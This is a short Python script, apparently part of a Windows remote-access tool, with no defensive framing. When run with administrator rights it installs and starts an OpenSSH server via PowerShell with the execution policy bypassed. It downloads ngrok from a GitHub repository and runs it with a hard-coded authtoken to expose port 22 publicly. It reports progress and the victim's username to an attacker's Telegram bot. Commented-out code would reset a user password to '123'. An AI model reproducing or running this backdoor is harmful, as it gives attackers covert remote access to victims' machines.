# -*- coding: utf-8 -*- 
import os
import sys
import getpass
import ctypes
import requests
import win32com.shell.shell as  shell
from subprocess import Popen
from zipfile import ZipFile
class SSH():
	def __init__(self):

		self.token = sys.argv[1]
		self.chat_id = sys.argv[2]
		self.ngrok = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/ngrok-stable-windows-386.zip"
		self.Main()

	def Main(self):
		if ctypes.windll.shell32.IsUserAnAdmin() == 1:
			os.system('taskkill /IM ngrok.exe /F')
			self.Install_SSH()
			self.Ngrok()
			#self.Change_Password()
		else:
			self.SendMessage("✖️ Need Admin Permissions.")

	def Install_SSH(self):
		self.SendMessage("📌 Installing SSH...")
		os.system('powershell.exe -ExecutionPolicy Bypass -c "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"')
		os.system('powershell.exe -ExecutionPolicy Bypass -c "Start-Service sshd"')
		self.SendMessage("✔️ SSH Installed")

	def Ngrok(self):
		self.SendMessage("📌 Donwloading Ngrok...")
		req = requests.get(self.ngrok)
		
		filename = os.environ['TEMP'] + "\\ngrok.zip"
		file = open(filename, "wb")
		file.write(req.content)
		file.close()
	
		with ZipFile(filename, 'r') as zip_ref:
			zip_ref.extractall(os.environ['TEMP'])
		Popen([os.environ['TEMP'] + "\\ngrok.exe","authtoken","27D5cTLjSznClCfArRRGjs2os83_6Ps5YmFqGTfUVZgvnR7e1"])
		Popen([os.environ['TEMP'] + "\\ngrok.exe","tcp","22"])
		#shell.ShellExecuteEx(lpFile=os.environ['TEMP'] + "\\ngrok.exe", lpParameters="tcp 22")
		self.SendMessage("✔ Ngrok Executed.")

	def Change_Password(self):
		Popen(["net","user","RA3D","123"])
	def SendMessage(self,message):
		requests.get("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)

SSH()
